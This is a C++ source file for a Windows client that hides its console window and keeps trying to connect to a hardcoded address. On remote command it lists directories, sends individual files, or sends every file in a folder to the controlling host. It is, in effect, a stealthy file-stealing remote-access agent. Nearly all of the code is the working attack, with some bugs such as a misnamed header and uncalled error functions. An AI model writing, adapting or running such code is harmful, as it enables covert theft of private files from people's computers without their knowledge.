#include <iostream>
#include <cstdlib>
#include <WS2tcpip.h>
#include <string>
#include <fstream>
#include <vector>
#ifdef _WIN32
#include <WinSock2.h>
#include <Windows.h>
#else
#include <sys/sockets.h>
#include <unistd.h>
#endif // For Windows And Linux Distribution
#include "Client_source1.cpp"
#pragma comment(lib, "ws2_32.lib")
using namespace std;

const int BUFFER_SIZE = 4096;
vector <char> buffer(BUFFER_SIZE + 1, 0);

int count_size(string loc)
{
    ifstream file(loc.c_str(), ios::binary | ios::ate);
    return file.tellg();
    file.close();
}

void send_file(string loc, SOCKET s)
{
    string name;
    int size;

    while (loc.find("/") != string::npos)
    {
        loc.replace(loc.find("/"), 1, "\\");
    }
    ifstream rfile;
    rfile.open(loc.c_str(), ios::in | ios::binary);
    name = loc.substr(loc.find_last_of("\\") + 1);
    size = count_size(loc);
    cout << size << endl;
    name.append(":");
    name.append(to_string(size));
    cout << name;
    send(s, name.c_str(), 1024, 0);

    if (rfile.is_open())
    {
        cout << "File opened" << endl;
    }
    else
    {
        cout << "Open Failed" << endl;
    }

    if (rfile.good())
    {
        cout << "Sending..." << endl;
        while (1)
        {
            rfile.read(buffer.data(), BUFFER_SIZE);
            streamsize sz = rfile.gcount();
            cout << sz;
            if (send(s, buffer.data(), sz, 0) < 0)
            {
                cout << "Send failed" << endl;
            }
            if (rfile.eof())
                break;
        }
        cout << "Sent" << endl;
    }
    else
    {
        cout << "Invalid FIle Location" << endl;
    }
    rfile.close();
}

int main()
{
    HWND stlth;
    AllocConsole();
    stlth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stlth, 0);

    while (1)
    {
#ifdef _WIN32
        WSADATA wsa;
        cout << "Initialising Winsock..." << endl;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        {
            cout << "Failed. Error Code: " << WSAGetLastError << endl;
        }
        cout << "Initialised" << endl;
#endif // For Windows Environment

        SOCKET s;
        sockaddr_in server;
        string addr, loc, name, message;
        int val_read, size, ch;

        cout << "Creating Socket..." << endl;
        if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            cout << "Could nor create socket: " << WSAGetLastError << endl;
        }
        cout << "Socket Created" << endl;

        cout << "Enter Server Address: ";
        //cin >> addr;
        addr = "192.168.0.11";

        if (inet_pton(AF_INET, addr.c_str(), &server.sin_addr) <= 0)
        {
            cout << "invalid address" << endl;
            return -1;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(50000);

        while (1)
        {
            if (connect(s, (sockaddr*)&server, sizeof(server)) < 0)
            {
                cout << "Connect Error" << endl;
                Sleep(5000);
            }
            else
            {
                break;
            }
        }
        cout << "Connected" << endl;

        while (1)
        {
            recv(s, buffer.data(), 1024, 0);
            message = buffer.data();
            ch = stoi(message.substr(0, 1));

            if (ch == 1)
            {
                listfiles(message.substr(1));
                string temp;
                ifstream rfile;
                rfile.open("files.txt");
                char delim = ';';
                temp = "FILES \n";
                send(s, temp.c_str(), 1024, 0);
                temp.clear();
                while (getline(rfile, temp, delim))
                {
                    send(s, temp.c_str(), 1024, 0);
                    temp.clear();
                }
                cout << "Completed" << endl;
                rfile.close();

                ifstream fofile;
                fofile.open("folders.txt");
                if (fofile.is_open())
                    cout << "opened" << endl;
                temp = "\n\nFOLDERS \n";
                send(s, temp.c_str(), 1024, 0);
                temp.clear();
                while (getline(fofile, temp, delim))
                {
                    send(s, temp.c_str(), 1024, 0);
                    temp.clear();
                }
                remove("files.txt");
                remove("folders.txt");
                temp = "complete";
                send(s, temp.c_str(), 1024, 0);
                fofile.close();
            }

            else if (ch == 2)
            {
                loc = message.substr(1);
                send_file(loc, s);
            }

            else if (ch == 3)
            {
                int tempi = listfiles(message.substr(1));
                string temp;
                temp = to_string(tempi);
                send(s, temp.c_str(), 1024, 0);
                ifstream mfile;
                mfile.open("files.txt");
                char delim = ';';
                while (getline(mfile, temp, delim))
                {
                    cout << "sending" << endl;
                    send_file(temp, s);
                    recv(s, buffer.data(), 1024, 0);
                    buffer.clear();
                }
                mfile.close();
            }

            else if (ch == 5 || ch == 6)
                break;
        }
        closesocket(s);
        WSACleanup();

        if (ch == 6)
            break;
    }
}